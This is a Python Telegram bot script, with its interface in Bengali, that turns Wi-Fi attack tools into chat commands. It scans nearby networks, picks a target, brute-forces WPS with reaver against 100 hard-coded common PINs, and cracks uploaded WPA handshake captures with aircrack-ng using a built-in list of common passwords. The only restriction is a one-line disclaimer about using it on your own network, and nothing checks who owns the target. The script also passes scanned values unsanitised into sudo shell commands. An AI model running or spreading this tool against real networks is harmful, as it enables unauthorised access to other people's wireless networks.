#!/usr/bin/env python3
"""
WPSApp টেলিগ্রাম বট – Render-এর জন্য পোলিং মোড (Python 3.13)
শুধুমাত্র নিজের নেটওয়ার্ক টেস্টের জন্য। দায়িত্ব নিয়ে ব্যবহার করুন।
"""

import os
import re
import asyncio
import subprocess
import tempfile
import logging
from typing import Dict, List, Optional

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== কনফিগারেশন ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set")

INTERFACE = os.environ.get("WLAN_INTERFACE", "wlan0")

# ========== ১০০টি কমন WPS PIN ==========
WPS_PINS = [
    "12345670", "00000000", "11111111", "12345678", "00000001",
    "12345679", "87654321", "12345671", "11223344", "12345672",
    "12345673", "12345674", "12345675", "12345676", "12345677",
    "12345679", "11111110", "11111112", "11111113", "11111114",
    "22222222", "22222223", "33333333", "44444444", "55555555",
    "66666666", "77777777", "88888888", "99999999", "12121212",
    "12121213", "12312312", "12312313", "12312314", "12312315",
    "13131313", "14141414", "15151515", "16161616", "17171717",
    "18181818", "19191919", "10101010", "20202020", "30303030",
    "40404040", "50505050", "60606060", "70707070", "80808080",
    "90909090", "01010101", "02020202", "03030303", "04040404",
    "05050505", "06060606", "07070707", "08080808", "09090909",
    "12340987", "12349876", "12348765", "12345609", "12345690",
    "98765432", "98765431", "98765430", "87654320", "76543210",
    "65432100", "54321000", "43210000", "32100000", "21000000",
    "10000000", "11112222", "11223355", "12344321", "12345543",
    "12345688", "12345699", "12457800", "12541254", "13467900",
    "13579135", "14725836", "15935700", "24681357", "25802580",
    "36925814", "45678901", "48151623", "51505150", "61616161",
    "71717171", "81818181", "91919191", "11122233", "22334455",
    "33445566", "44556677", "55667788", "66778899", "77889900"
]

# ========== ১০০টি কমন ও আনকমন WPA পাসওয়ার্ড ==========
WPA_PASSWORDS = [
    "password", "12345678", "123456789", "1234567890", "qwerty",
    "qwerty123", "abc123", "111111", "11111111", "password123",
    "admin", "welcome", "letmein", "monkey", "dragon",
    "master", "sunshine", "princess", "iloveyou", "fuckyou",
    "superman", "batman", "trustno1", "1234567", "123456",
    "12345", "1234", "000000", "00000000", "555555",
    "666666", "7777777", "88888888", "9999999", "qwertyuiop",
    "asdfgh", "zxcvbn", "1q2w3e", "1q2w3e4r", "1qaz2wsx",
    "qazwsx", "michael", "ashley", "michelle", "jennifer",
    "jordan", "charlie", "thomas", "robert", "james",
    "william", "david", "richard", "joseph", "charles",
    "thomas", "christopher", "daniel", "matthew", "anthony",
    "donald", "mark", "paul", "steven", "andrew",
    "kenneth", "joshua", "kevin", "brian", "george",
    "timothy", "ronald", "edward", "jason", "jeffrey",
    "ryan", "jacob", "gary", "nicholas", "eric",
    "jonathan", "stephen", "larry", "justin", "scott",
    "brandon", "benjamin", "samuel", "raymond", "gregory",
    "frank", "alexander", "patrick", "jack", "dennis",
    "jerry", "tyler", "aaron", "jose", "nathan",
    "password1", "passw0rd", "admin123", "qwerty123", "letmein123"
]

# ========== লগিং সেটআপ ==========
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== হেল্পার ফাংশন (async) ==========
async def run_command(cmd: str, timeout: int = 30) -> str:
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return stdout.decode() + stderr.decode()
    except asyncio.TimeoutError:
        proc.kill()
        return "TIMEOUT"
    except Exception as e:
        return f"ERROR: {e}"

# ========== বটের কমান্ড হ্যান্ডলার ==========

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **WPSApp বটে স্বাগতম!**\n\n"
        "আমি আপনার Wi-Fi নেটওয়ার্কের নিরাপত্তা টেস্ট করতে সাহায্য করি।\n"
        "⚠️ **শুধুমাত্র আপনার নিজের নেটওয়ার্কে ব্যবহার করুন।**\n\n"
        "📌 **উপলব্ধ কমান্ড:**\n"
        "/scan – আশেপাশের নেটওয়ার্ক স্ক্যান করুন\n"
        "/select <নম্বর> – টার্গেট সিলেক্ট করুন\n"
        "/wpscheck – WPS স্ট্যাটাস চেক\n"
        "/wpspin – ১০০টি কমন পিন ট্রাই করুন\n"
        "/dicattack – .cap ফাইল আপলোড করে ডিকশনারি অ্যাটাক\n"
        "/help – এই মেসেজ"
    )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("📡 স্ক্যান শুরু হচ্ছে... (৩০ সেকেন্ড)")
    cmd = f"sudo iwlist {INTERFACE} scan"
    output = await run_command(cmd, timeout=45)

    if "TIMEOUT" in output:
        await msg.edit_text("⏰ টাইমআউট। ইন্টারফেস চেক করুন।")
        return
    if "ERROR" in output:
        await msg.edit_text(f"❌ ত্রুটি: {output}")
        return

    networks = []
    current = {}
    for line in output.split('\n'):
        line = line.strip()
        if "Cell" in line and "Address" in line:
            if current:
                networks.append(current)
            current = {}
            match = re.search(r"Address: ([0-9A-F:]+)", line)
            if match:
                current["bssid"] = match.group(1)
        elif "ESSID:" in line:
            essid = line.split("ESSID:")[1].strip('"')
            current["essid"] = essid if essid else "(Hidden)"
        elif "Channel:" in line:
            current["channel"] = line.split("Channel:")[1].strip()
    if current:
        networks.append(current)

    if not networks:
        await msg.edit_text("❌ কোনো নেটওয়ার্ক পাওয়া যায়নি।")
        return

    context.user_data['networks'] = networks
    reply = "📋 **পাওয়া নেটওয়ার্ক:**\n\n"
    for i, net in enumerate(networks):
        reply += f"{i+1}. {net.get('essid', 'Unknown')} ({net.get('bssid', 'N/A')}) - Ch {net.get('channel', '?')}\n"
    reply += f"\nমোট {len(networks)}টি। সিলেক্ট করতে `/select <নম্বর>` দিন।"
    await msg.edit_text(reply, parse_mode='Markdown')

async def select(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❗ ব্যবহার: `/select <নম্বর>`")
        return
    try:
        idx = int(args[0]) - 1
        networks = context.user_data.get('networks', [])
        if not networks:
            await update.message.reply_text("❌ আগে `/scan` চালান।")
            return
        if idx < 0 or idx >= len(networks):
            await update.message.reply_text("❌ ভুল নম্বর।")
            return
        target = networks[idx]
        context.user_data['target_bssid'] = target.get('bssid')
        context.user_data['target_essid'] = target.get('essid')
        await update.message.reply_text(
            f"✅ টার্গেট সিলেক্ট: {target.get('essid')} ({target.get('bssid')})"
            f"\nএখন `/wpscheck` বা `/wpspin` চালান।"
        )
    except (ValueError, IndexError):
        await update.message.reply_text("❌ সঠিক নম্বর দিন।")

async def wpscheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bssid = context.user_data.get('target_bssid')
    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিন।")
        return
    msg = await update.message.reply_text(f"🔍 {bssid} এর WPS স্ট্যাটাস চেক...")
    cmd = f"sudo wash -i {INTERFACE} -b {bssid} -c 1"
    output = await run_command(cmd, timeout=20)

    if "TIMEOUT" in output or not output.strip():
        await msg.edit_text("❌ WPS বন্ধ থাকতে পারে।")
        return

    found = False
    for line in output.split('\n'):
        if bssid.lower() in line.lower():
            parts = line.split()
            if len(parts) >= 6:
                info = f"📡 **WPS তথ্য:**\nBSSID: {parts[0]}\nচ্যানেল: {parts[1]}\nRSSI: {parts[2]}\nWPS ভার্সন: {parts[3]}\nলকড: {parts[4]}\nম্যানুফ্যাকচারার: {' '.join(parts[5:])}"
                if parts[4].lower() == "no" and parts[3].startswith("1."):
                    info += "\n\n⚠️ **সম্ভাব্য ভলনারেবল!**"
                else:
                    info += "\n\n🛡️ নিরাপদ বা লককৃত।"
                await msg.edit_text(info, parse_mode='Markdown')
                found = True
                break
    if not found:
        await msg.edit_text("❌ WPS তথ্য পাওয়া যায়নি।")

async def wpspin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bssid = context.user_data.get('target_bssid')
    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিন।")
        return
    msg = await update.message.reply_text(f"🔑 {len(WPS_PINS)}টি পিন ট্রাই শুরু...")
    found_pin = None
    for i, pin in enumerate(WPS_PINS):
        if i % 10 == 0:
            await msg.edit_text(f"⏳ ট্রাই {i+1}/{len(WPS_PINS)}... (পিন: {pin})")
        cmd = f"sudo reaver -i {INTERFACE} -b {bssid} -p {pin} -t 1 -d 0 -c 1"
        output = await run_command(cmd, timeout=15)
        if "WPS PIN" in output and "success" in output.lower():
            found_pin = pin
            break
        if "PIN found" in output:
            found_pin = pin
            break
    if found_pin:
        await msg.edit_text(f"✅ **সফল!** পিন: `{found_pin}`")
    else:
        await msg.edit_text("❌ সব পিন ব্যর্থ।")

async def dicattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cap_path = context.user_data.get('cap_file_path')
    bssid = context.user_data.get('target_bssid')
    if not bssid:
        await update.message.reply_text("❓ আগে `/select` দিন।")
        return
    if not cap_path or not os.path.exists(cap_path):
        await update.message.reply_text("❓ প্রথমে `.cap` ফাইল আপলোড করুন।")
        return

    msg = await update.message.reply_text(f"🔓 {len(WPA_PASSWORDS)}টি পাসওয়ার্ড ট্রাই...")
    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
        wordlist_path = f.name
        for pwd in WPA_PASSWORDS:
            f.write(pwd + "\n")

    cmd = f"sudo aircrack-ng -w {wordlist_path} -b {bssid} {cap_path}"
    output = await run_command(cmd, timeout=120)
    try:
        os.unlink(wordlist_path)
    except:
        pass

    if "KEY FOUND" in output:
        match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
        if match:
            await msg.edit_text(f"✅ **পাসওয়ার্ড:** `{match.group(1)}`")
            return
    await msg.edit_text("❌ কোনো পাসওয়ার্ড মেলেনি।")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith('.cap'):
        await update.message.reply_text("❌ শুধু `.cap` ফাইল আপলোড করুন।")
        return
    with tempfile.NamedTemporaryFile(delete=False, suffix='.cap') as tmp:
        tmp_path = tmp.name
    file = await doc.get_file()
    await file.download_to_drive(tmp_path)
    context.user_data['cap_file_path'] = tmp_path
    await update.message.reply_text(f"✅ `.cap` ফাইল সেভ করা হয়েছে। এখন `/dicattack` চালান।")

# ========== মেইন ফাংশন (পোলিং) ==========
async def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("scan", scan))
    application.add_handler(CommandHandler("select", select))
    application.add_handler(CommandHandler("wpscheck", wpscheck))
    application.add_handler(CommandHandler("wpspin", wpspin))
    application.add_handler(CommandHandler("dicattack", dicattack))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # পোলিং মোড (ওয়েবহুক না)
    logger.info("Starting bot in polling mode...")
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
